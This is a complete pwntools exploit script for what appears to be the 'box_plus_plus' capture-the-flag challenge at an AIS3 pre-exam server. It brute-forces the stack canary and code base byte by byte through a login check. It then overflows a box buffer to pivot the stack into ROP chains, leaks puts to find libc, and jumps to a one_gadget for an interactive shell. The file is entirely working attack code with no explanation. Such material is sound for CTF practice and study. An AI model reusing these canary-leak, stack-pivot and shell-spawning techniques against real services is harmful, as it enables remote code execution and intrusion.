#!/usr/bin/env python2
from pwn import *
import re
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
#context.log_level = 'debug'
libc = ELF('./libc.so.6')
binary = ELF('./box_plus_plus')

#r = process('./box_plus_plus')
r = remote('pre-exam-pwn.ais3.org', 10007)

def register(acc, pwd):
    r.sendlineafter('>\n', '1')
    r.sendafter('Account: ', acc)
    r.sendafter('Password: ', pwd)

def login(acc, pwd):
    r.sendlineafter('>\n', '2')
    r.sendafter('account: ', acc)
    r.sendafter('Password : ', pwd)


# not able to guess them all because '\n' will be changed to '\0'
def guess(cnt, prepend=''):
    stack_leak = prepend

    while cnt > 0:
        for i in range(256):
            r.sendlineafter('>\n', '2')
            r.sendafter('account: ', '\x00')
            r.sendafter('Password : ', stack_leak + chr(i))
            res = r.recvline()
            if re.search('success', res):
                r.sendlineafter('>\n', '5')
                stack_leak += chr(i)
                break
        cnt -= 1

    return stack_leak

def new_box(s):
    r.sendlineafter('>\n', '1')
    r.sendlineafter('> ', s)

def edit_box(idx, s):
    r.sendlineafter('>\n', '2')
    r.sendlineafter('box?\n', str(idx))
    r.sendafter('> ', s)

def del_box(idx):
    r.sendlineafter('>\n', '4')
    r.sendlineafter('box?\n', str(idx))

def logout_box():
    r.sendlineafter('>\n', '5')


register('\0', '\0'*0x80)
leak = guess(16, '\0'*0x88)
canary = leak[-16:-8]
text_base = u64(leak[-8:]) - 0x1220
buf = text_base + 0x202060
new_buf = text_base + 0x202f00
pop_rdi = text_base + 0x1283
pop_r12_15 = text_base + 0x127c
pop_rsi_r15 = text_base + 0x1281
pop_r15 = text_base + 0x1282
set_rdx = text_base + 0x1260
leave_ret = text_base + 0xb82
print canary
print hex(text_base)

#0x0000000000001260 : mov rdx, r15 ; mov rsi, r14 ; mov edi, r13d ; call qword ptr [r12 + rbx*8]
payload = flat(
    new_buf,
    pop_r12_15,
    buf + 0x48,
    0,
    new_buf,
    0x100,
    set_rdx,
    text_base + binary.plt['read'],
    leave_ret,
    pop_r15 # used for call qword ptr [r12 + rbx*8]
)

payload2 = flat(
    'DEADBEEF',
    pop_rdi,
    text_base + binary.got['puts'],
    text_base + binary.plt['puts'],
    pop_r12_15,
    buf + 0x48,
    0,
    new_buf + 0x58,
    0x50,
    set_rdx,
    text_base + binary.plt['read']
)

login('\0', '\0')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
new_box('A')
del_box(6)
new_box('A'*232)

# max 255-1 = 254 char
edit_box(7, payload.ljust(232) + canary + p64(buf) + p64(leave_ret)[:6])
logout_box()

r.send(payload2)

libc_base = u64(r.recvn(6).ljust(8, '\x00')) - libc.symbols['puts']
print hex(libc_base)
magic = libc_base + 0x4f322

raw_input()
r.send(p64(magic))

r.interactive()
